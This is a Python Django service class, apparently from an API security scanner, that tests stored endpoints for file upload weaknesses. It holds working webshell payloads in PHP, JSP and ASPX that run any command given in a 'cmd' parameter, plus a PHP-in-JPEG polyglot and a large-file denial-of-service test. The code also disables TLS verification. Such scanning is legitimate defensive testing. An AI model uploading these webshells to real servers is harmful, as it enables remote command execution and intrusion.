# api_4/services.py
import requests
import json
import logging
import time
import tempfile
import os
from django.utils import timezone
from io import BytesIO
from django.db import connection
from django.conf import settings
from .models import FileUploadScanResult, FileUploadTest, ScanSession

logger = logging.getLogger(__name__)

class FileUploadVulnerabilityScanner:
    """Main service class for scanning file upload vulnerabilities"""
    
    def __init__(self, scan_id, user):
        self.scan_id = scan_id
        self.user = user
        self.session = requests.Session()
        self.test_files = self._prepare_test_files()
        
    def _prepare_test_files(self):
        """Prepare various test files for vulnerability testing"""
        return {
            'webshell_php': {
                'name': 'shell.php',
                'content': '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>',
                'type': 'webshell',
                'size': len('<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>'),
            },
            'webshell_jsp': {
                'name': 'shell.jsp',
                'content': '<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("cmd") != null) { out.println("<pre>"); Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %>',
                'type': 'webshell',
                'size': 400,
            },
            'webshell_aspx': {
                'name': 'shell.aspx',
                'content': '<%@ Page Language="C#" %><script runat="server">void Page_Load(object sender, EventArgs e){if(Request["cmd"]!=null){Response.Write("<pre>");Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]).StandardOutput.ReadToEnd());Response.Write("</pre>");}}</script>',
                'type': 'webshell',
                'size': 300,
            },
            'large_file': {
                'name': 'large_test.txt',
                'content': None,  # Will be generated
                'type': 'large_file',
                'size': 10 * 1024 * 1024,  # 10MB for testing (can be increased)
            },
            'executable': {
                'name': 'test.exe',
                'content': 'MZ\x90\x00' + '\x00' * 100,  # Simple PE header
                'type': 'unrestricted',
                'size': 104,
            },
            'script': {
                'name': 'test.sh',
                'content': '#!/bin/bash\necho "Hello World"',
                'type': 'unrestricted',
                'size': 30,
            },
            'image_with_php': {
                'name': 'image.php.jpg',
                'content': '\xFF\xD8\xFF\xE0\x00\x10JFIF<?php system($_GET["cmd"]); ?>',
                'type': 'webshell',
                'size': 50,
            }
        }
    
    def get_apis_for_scan(self):
        """Fetch APIs from api_orch_postmanapi table for the given scan_id"""
        with connection.cursor() as cursor:
            cursor.execute("""
                SELECT "id", "name", "method", "url", "headers", "body", "authorization", "query_params"
                FROM api_orch_postmanapi
                WHERE "scan_id" = %s
            """, [self.scan_id])
            
            columns = [col[0] for col in cursor.description]
            return [dict(zip(columns, row)) for row in cursor.fetchall()]
    
    def get_jwt_token(self):
        """Get JWT token from api_orch_scantokens table"""
        with connection.cursor() as cursor:
            cursor.execute("""
                SELECT access_token
                FROM api_orch_scantokens
                WHERE scan_id = %s
                LIMIT 1
            """, [self.scan_id])
            
            result = cursor.fetchone()
            return result[0] if result else None
    
    def start_scan(self):
        """Start the vulnerability scan for all APIs"""
        logger.info(f"Starting file upload vulnerability scan for scan_id: {self.scan_id}")
        
        # Create or get scan session
        scan_session, created = ScanSession.objects.get_or_create(
            scan_id=self.scan_id,
            defaults={'user': self.user, 'status': 'running'}
        )
        
        if not created:
            scan_session.status = 'running'
            scan_session.save()
        
        try:
            apis = self.get_apis_for_scan()
            jwt_token = self.get_jwt_token()
            
            if not apis:
                logger.warning(f"No APIs found for scan_id: {self.scan_id}")
                scan_session.status = 'completed'
                scan_session.save()
                return
            
            scan_session.total_apis = len(apis)
            scan_session.save()
            
            vulnerable_count = 0
            
            for api in apis:
                try:
                    result = self.scan_api_for_file_upload(api, jwt_token)
                    if result and result.status == 'vulnerable':
                        vulnerable_count += 1
                    
                    scan_session.completed_apis += 1
                    scan_session.save()
                    
                except Exception as e:
                    logger.error(f"Error scanning API {api.get('id')}: {str(e)}")
                    continue
            
            scan_session.vulnerable_apis = vulnerable_count
            scan_session.status = 'completed'
            scan_session.completed_at = timezone.now()
            scan_session.save()
            
            logger.info(f"Scan completed. Found {vulnerable_count} vulnerable APIs out of {len(apis)} total.")
            
        except Exception as e:
            logger.error(f"Scan failed: {str(e)}")
            scan_session.status = 'failed'
            scan_session.save()
            raise
    
    def scan_api_for_file_upload(self, api_data, jwt_token):
        """Scan a specific API for file upload vulnerabilities"""
        start_time = time.time()
        
        logger.info(f"Scanning API: {api_data['name']} - {api_data['method']} {api_data['url']}")
        
        # Check if this API might accept file uploads
        if not self._might_accept_file_uploads(api_data):
            logger.info(f"API {api_data['name']} unlikely to accept file uploads, skipping")
            return None
        
        result = FileUploadScanResult.objects.create(
            scan_id=self.scan_id,
            api_id=api_data['id'],
            api_name=api_data['name'],
            api_url=api_data['url'],
            api_method=api_data['method'],
            status='safe'
        )
        
        try:
            # Test for file upload capability
            accepts_uploads = self._test_file_upload_capability(api_data, jwt_token, result)
            result.accepts_file_upload = accepts_uploads
            
            if accepts_uploads:
                logger.info(f"API {api_data['name']} accepts file uploads. Testing vulnerabilities...")
                
                # Test webshell uploads
                webshell_success = self._test_webshell_uploads(api_data, jwt_token, result)
                result.webshell_upload_success = webshell_success
                
                # Test large file uploads
                large_file_success = self._test_large_file_upload(api_data, jwt_token, result)
                result.large_file_upload_success = large_file_success
                
                # Test unrestricted file types
                unrestricted_success = self._test_unrestricted_file_types(api_data, jwt_token, result)
                result.unrestricted_file_types = unrestricted_success
                
                # Determine vulnerability status
                if webshell_success or large_file_success or unrestricted_success:
                    result.status = 'vulnerable'
                    if webshell_success and (large_file_success or unrestricted_success):
                        result.vulnerability_type = 'mixed'
                    elif webshell_success:
                        result.vulnerability_type = 'webshell'
                    elif large_file_success:
                        result.vulnerability_type = 'large_file'
                    elif unrestricted_success:
                        result.vulnerability_type = 'unrestricted'
                else:
                    result.status = 'suspicious'  # Accepts uploads but has protections
            
        except Exception as e:
            logger.error(f"Error during vulnerability scan: {str(e)}")
            result.status = 'error'
            result.error_message = str(e)
        
        result.scan_duration = time.time() - start_time
        result.save()
        
        return result
    
    def _might_accept_file_uploads(self, api_data):
        """Heuristic to determine if an API might accept file uploads"""
        method = api_data['method'].upper()
        url = api_data['url'].lower()
        
        # Only POST/PUT/PATCH methods typically accept file uploads
        if method not in ['POST', 'PUT', 'PATCH']:
            return False
        
        # Check URL patterns that might indicate file upload endpoints
        upload_keywords = ['upload', 'file', 'attachment', 'media', 'image', 'document', 'avatar', 'profile']
        if any(keyword in url for keyword in upload_keywords):
            return True
        
        # Check if body or headers suggest multipart/form-data
        headers = json.loads(api_data.get('headers', '{}'))
        content_type = headers.get('Content-Type', '').lower()
        if 'multipart' in content_type:
            return True
        
        return True  # Default to testing if uncertain
    
    def _test_file_upload_capability(self, api_data, jwt_token, result):
        """Test if the API accepts basic file uploads"""
        try:
            # Prepare a simple test image file
            test_file_content = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\x0cIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xdb\x00\x00\x00\x00IEND\xaeB`\x82'
            
            files = {'file': ('test.png', BytesIO(test_file_content), 'image/png')}
            
            headers = self._prepare_headers(api_data, jwt_token, multipart=True)
            
            response = self._make_request(
                api_data['method'],
                api_data['url'],
                headers=headers,
                files=files,
                query_params=json.loads(api_data.get('query_params', '{}'))
            )
            
            result.response_status_code = response.status_code
            result.response_headers = dict(response.headers)
            result.response_body_snippet = response.text[:500]
            
            # Consider 200, 201, 202 as successful uploads
            return response.status_code in [200, 201, 202]
            
        except Exception as e:
            logger.error(f"Error testing file upload capability: {str(e)}")
            return False
    
    def _test_webshell_uploads(self, api_data, jwt_token, result):
        """Test uploading webshell files"""
        webshell_success = False
        
        webshell_files = ['webshell_php', 'webshell_jsp', 'webshell_aspx', 'image_with_php']
        
        for file_key in webshell_files:
            test_file = self.test_files[file_key]
            
            try:
                files = {'file': (test_file['name'], BytesIO(test_file['content'].encode()), 'application/octet-stream')}
                headers = self._prepare_headers(api_data, jwt_token, multipart=True)
                
                response = self._make_request(
                    api_data['method'],
                    api_data['url'],
                    headers=headers,
                    files=files,
                    query_params=json.loads(api_data.get('query_params', '{}'))
                )
                
                upload_success = response.status_code in [200, 201, 202]
                
                # Record the test
                FileUploadTest.objects.create(
                    scan_result=result,
                    file_name=test_file['name'],
                    file_type=test_file['type'],
                    file_size=test_file['size'],
                    test_type='webshell',
                    upload_success=upload_success,
                    response_status=response.status_code,
                    response_message=response.text[:200]
                )
                
                if upload_success:
                    webshell_success = True
                    logger.warning(f"Webshell upload successful: {test_file['name']}")
                
            except Exception as e:
                logger.error(f"Error testing webshell upload {file_key}: {str(e)}")
        
        return webshell_success
    
    def _test_large_file_upload(self, api_data, jwt_token, result):
        """Test uploading large files"""
        try:
            # Create a large file in memory (10MB)
            large_content = b'A' * (10 * 1024 * 1024)  # 10MB
            
            files = {'file': ('large_test.txt', BytesIO(large_content), 'text/plain')}
            headers = self._prepare_headers(api_data, jwt_token, multipart=True)
            
            # Set timeout for large file upload
            response = self._make_request(
                api_data['method'],
                api_data['url'],
                headers=headers,
                files=files,
                query_params=json.loads(api_data.get('query_params', '{}')),
                timeout=300  # 5 minutes timeout
            )
            
            upload_success = response.status_code in [200, 201, 202]
            
            FileUploadTest.objects.create(
                scan_result=result,
                file_name='large_test.txt',
                file_type='large_file',
                file_size=len(large_content),
                test_type='large_file',
                upload_success=upload_success,
                response_status=response.status_code,
                response_message=response.text[:200]
            )
            
            if upload_success:
                logger.warning("Large file upload successful - potential DoS vulnerability")
            
            return upload_success
            
        except Exception as e:
            logger.error(f"Error testing large file upload: {str(e)}")
            return False
    
    def _test_unrestricted_file_types(self, api_data, jwt_token, result):
        """Test uploading restricted file types"""
        unrestricted_success = False
        
        restricted_files = ['executable', 'script']
        
        for file_key in restricted_files:
            test_file = self.test_files[file_key]
            
            try:
                files = {'file': (test_file['name'], BytesIO(test_file['content'].encode()), 'application/octet-stream')}
                headers = self._prepare_headers(api_data, jwt_token, multipart=True)
                
                response = self._make_request(
                    api_data['method'],
                    api_data['url'],
                    headers=headers,
                    files=files,
                    query_params=json.loads(api_data.get('query_params', '{}'))
                )
                
                upload_success = response.status_code in [200, 201, 202]
                
                FileUploadTest.objects.create(
                    scan_result=result,
                    file_name=test_file['name'],
                    file_type=test_file['type'],
                    file_size=test_file['size'],
                    test_type='unrestricted',
                    upload_success=upload_success,
                    response_status=response.status_code,
                    response_message=response.text[:200]
                )
                
                if upload_success:
                    unrestricted_success = True
                    logger.warning(f"Unrestricted file upload successful: {test_file['name']}")
                
            except Exception as e:
                logger.error(f"Error testing unrestricted upload {file_key}: {str(e)}")
        
        return unrestricted_success
    
    def _prepare_headers(self, api_data, jwt_token, multipart=False):
        """Prepare headers for the request"""
        headers = json.loads(api_data.get('headers', '{}'))
        
        # Add JWT authentication if available
        if jwt_token:
            headers['Authorization'] = f'Bearer {jwt_token}'
        
        # Remove Content-Type for multipart uploads (requests will set it)
        if multipart and 'Content-Type' in headers:
            del headers['Content-Type']
        
        return headers
    
    def _make_request(self, method, url, headers=None, files=None, data=None, query_params=None, timeout=60):
        """Make HTTP request with proper error handling"""
        try:
            response = self.session.request(
                method=method.upper(),
                url=url,
                headers=headers,
                files=files,
                data=data,
                params=query_params,
                timeout=timeout,
                verify=False  # For testing purposes, disable SSL verification
            )
            return response
        except requests.exceptions.Timeout:
            logger.error(f"Request timeout for {method} {url}")
            raise
        except requests.exceptions.ConnectionError:
            logger.error(f"Connection error for {method} {url}")
            raise
        except Exception as e:
            logger.error(f"Request error for {method} {url}: {str(e)}")
            raise